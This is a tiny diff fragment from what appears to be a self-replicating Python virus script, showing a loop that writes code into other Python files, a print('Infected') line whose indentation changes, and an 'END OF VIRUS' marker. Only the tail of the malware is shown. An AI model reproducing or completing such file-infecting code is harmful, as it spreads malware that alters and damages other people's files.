@@ -35,6 +35,6 @@ for script in python_scripts:
         with open(script, 'w') as f:
             f.writelines(final_code)
 
-    print('Infected')
+print('Infected')
 
 ### END OF VIRUS ###
